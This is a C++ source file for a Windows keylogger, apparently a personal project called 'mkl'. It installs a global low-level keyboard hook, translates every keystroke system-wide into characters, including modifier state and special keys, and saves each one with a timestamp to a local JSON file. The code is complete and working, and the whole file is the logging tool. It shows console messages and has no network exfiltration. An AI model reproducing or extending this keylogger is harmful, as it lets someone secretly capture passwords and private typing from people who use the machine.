#include <iostream>
#include <windows.h>
#include <vector>
#include <algorithm>
#include <fstream>

#include <filesystem>
namespace fs = std::filesystem;

//For json:
#include "dep/json.hpp"
using json = nlohmann::ordered_json;

//status symbols
const char* k = "[+] ";
const char* i = "[*] ";
const char* e = "[-] ";

//state-based keys:
bool ctrl = false;
bool shift = false;
bool alt = false;

//Create a list of keys to ignore:
const std::vector<int> vSysKeys = {
	VK_MENU, VK_LMENU, VK_RMENU, 
	VK_SHIFT, VK_LSHIFT, VK_RSHIFT,
	VK_CONTROL, VK_LCONTROL, VK_RCONTROL};

HHOOK hHook;

KBDLLHOOKSTRUCT* hsData;

std::string key_press_data;

//paths:
fs::path pSelf;
fs::path pOut;

//json file
json data;
std::string sJsonVersion = "0.0.0.1";
int iEventCount = 0;

void addEvent(std::string key, bool mods[], int time){
	iEventCount += 1;

	//create event
	//json event = {
	//	{"id", iEventCount},
	//	{"code", code},
	//	{"mods", {
	//		{"shft", mods[0]},
	//		{"ctrl", mods[1]},
	//		{"alt", mods[2]}}
	//	},
	//	{"time", time}
	//};

	//{k: '1', t: 4981483}

	json event = {{"k", key},{"t", time}};

	//Check for output file
	if (fs::exists(pOut)){
		//read in from file
		std::ifstream in(pOut.string());
		in >> data;
	} 
	else {
		//Cannot find file, re-init
		std::cout << e << "Cannot find output file, re-initializing...: " << GetLastError() << std::endl;

		//re-init
		data["app"] = "mkl";
		data["version"] = sJsonVersion;
		data["events"] = json::array();
	}

	//Add event to events
	data["events"].push_back(event);

	//Write to file:
	std::ofstream out(pOut);
	out << data.dump(2);

}


//Callback function for the hook!
LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
	
	//Leave early if not a relevent msg
	if (code < 0) { return CallNextHookEx(hHook, code, wParam, lParam);}

	//lParam is a long long int that contains the memory address of a struct
	//We need to actually create a proper pointer and set lParam as the address:
	//We do this by creating a pointer of the type we want to access.
	KBDLLHOOKSTRUCT* ptrKBDStruct;

	//We then cast lParam to that type (pointer of KBDLLHOOKSTRUCT)
	ptrKBDStruct = (KBDLLHOOKSTRUCT*)lParam;

	//Now to read the data, we need to de-refrence the new pointer and get the data:
	KBDLLHOOKSTRUCT data = *ptrKBDStruct;

	//std::cout << i << "Key Code: " << data.vkCode << std::endl;
	//std::cout << i << "Scan Code: " << data.scanCode << std::endl;
	//std::cout << i << "flags: " << data.flags << std::endl;
	//std::cout << i << "time: " << data.time << std::endl;
	//std::cout << i << "info: " << data.dwExtraInfo << std::endl;

	// === State Keys ===
	//wParam contains type of msg, WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
		switch (data.vkCode){
			case VK_CONTROL:
			case VK_RCONTROL:
			case VK_LCONTROL:
				ctrl = true;
				break;

			case VK_SHIFT:
			case VK_RSHIFT:
			case VK_LSHIFT:
				shift = true;
				break;

			case VK_MENU:
			case VK_RMENU:
			case VK_LMENU:
				alt = true;
				break;
		}

	} else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
		switch (data.vkCode){

			case VK_CONTROL:
			case VK_RCONTROL:
			case VK_LCONTROL:
				ctrl = false;
				break;

			case VK_SHIFT:
			case VK_RSHIFT:
			case VK_LSHIFT:
				shift = false;
				break;

			case VK_MENU:
			case VK_RMENU:
			case VK_LMENU:
				alt = false;
				break;
		}
	}
	// ==================
	

	//check if the pressed key is not one of them:
	if (std::find(vSysKeys.begin(), vSysKeys.end(), data.vkCode) == vSysKeys.end()){
		//If it is a down stroke:
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
			//print to terminal:
			//std::cout << i << "Key: " << data.vkCode << " | Shift: " << shift << " | Ctrl: " << ctrl << " | Alt: " << alt <<  std::endl;

			bool mods[3] = {shift, ctrl, alt};

			//addEvent(data.vkCode, mods, data.time);

			//Keyboard State
			BYTE bKeyStates[256];

			//write to keyStates
			GetKeyboardState(bKeyStates);

			//add in states manually:
			//0x80 = key down
			// Inject real modifier state from your hook tracking
			if (shift) {
			    bKeyStates[VK_SHIFT]   |= 0x80;
			    bKeyStates[VK_LSHIFT]  |= 0x80;
			    bKeyStates[VK_RSHIFT]  |= 0x80;
			}
			
			if (ctrl) {
			    bKeyStates[VK_CONTROL]  |= 0x80;
			    bKeyStates[VK_LCONTROL] |= 0x80;
			    bKeyStates[VK_RCONTROL] |= 0x80;
			}
			
			if (alt) {
			    bKeyStates[VK_MENU]  |= 0x80;
			    bKeyStates[VK_LMENU] |= 0x80;
			    bKeyStates[VK_RMENU] |= 0x80;
			}

			WCHAR pwszBuff[8];
			int iBuffSize = 8;
			int iFlags = 2;

			std::string sSwResult;

			//Testing with get the unicode value of what is being typed
			int result = ToUnicode(data.vkCode, data.scanCode, bKeyStates, pwszBuff, iBuffSize, iFlags);

			//TODO: Temp Solution / UNSAFE!!!

			//std::ofstream file(pOut, std::ios::app); // append mode

    		//if (!file) return 1;

			switch (pwszBuff[0]){
				case VK_BACK:
					sSwResult =  "[\\b]";
					break;
				case VK_TAB:
					sSwResult = "[\\t]";
					break;
				case VK_RETURN:
					sSwResult = "[\\r]";
					break;

				case 0x00:
					switch (data.vkCode) {
						case 46: sSwResult = "[DEL]"; break;
						case 45: sSwResult = "[INS]"; break;
						case 20: sSwResult = "[CL]"; break;
						case 38: sSwResult = "[/\\]"; break;
						case 37: sSwResult = "[<-]"; break;
						case 39: sSwResult = "[->]"; break;
						case 40: sSwResult = "[\\/]"; break;
						case 144:sSwResult = "[NL]"; break;
						default: sSwResult = "[UKN|" + std::to_string(data.vkCode) + "]";break;
					}
					break;

				default:
					char ascii = (char)pwszBuff[0];
					sSwResult = std::string(1,ascii);
			}

			//One We Have the resulting key, write to the output:
			//file << sSwResult;
			addEvent(sSwResult, mods, data.time);
		}
	}


	//Send to the next procedure
	return CallNextHookEx(hHook, code, wParam, lParam);
}


// === Main ===
int main(int argc, char* argv[]){

	//get root dir:
	char szBuffer[MAX_PATH];

	//Get the location of self:
	GetModuleFileNameA(
		NULL, //The proc handle you want to get the path to. when null, returns path of self 
		szBuffer, //A pointer to a buffer that receives the fully qualified path of the module.
		MAX_PATH); //The max size of the path

	//set output path
	pSelf = szBuffer;
	pOut = pSelf.parent_path() / "data" / "out.json";

	//Verify file:
	if (fs::exists(pOut) == false) {
		std::cout << i << pOut.filename() << " does not exist, it will be created." << std::endl;
	} 
	else {std::cout << k << pOut.filename() << " found." << std::endl;}


	//// === Init Json ===
	//data["app"] = "mkl";
	//data["version"] = sJsonVersion;
//
	////Make events array
	//data["events"] = json::array();
//
	////Write to file:
	//std::ofstream out(pOut);
	//if (!out.is_open()) {
	//	std::cout << e << "Unable to open file: " << GetLastError() << std::endl;
	//	return 1;
	//}
	//
	//out << data.dump(4);
	//
	//if (out.fail()) {
	//	std::cout << e << "Init write Failed: " << GetLastError() << std::endl;
	//	return 1;
	//}
//
	//std::cout << k << "Init write success!" << std::endl;
//
	//out.close();
	// =================



	//Set Windows Hook parameters
	int idHook = WH_KEYBOARD_LL;

	HOOKPROC lpfn = SomeProc; //pointer to the hook callback fn

	//Relevenat for hooking into specifc apps:
	HINSTANCE hmod = NULL; //
	DWORD dwThreadId = 0; //The thread containing the procedure

	//Install Hook!
	hHook = SetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);

	//Check hook installed
	if (hHook == NULL) {
		std::cout << e << "Hook not installed. err:" << GetLastError() << std::endl;
		return 1;
	}

	std::cout << k << "Hook succesfully installed!" << std::endl;

	//Loop:
	MSG msg;

	while (GetMessage(&msg, 0, 0, 0)) {

		//continues msg through queue
		PeekMessage(&msg, 0, 0, 0,PM_REMOVE);
	}

	return WN_SUCCESS;
}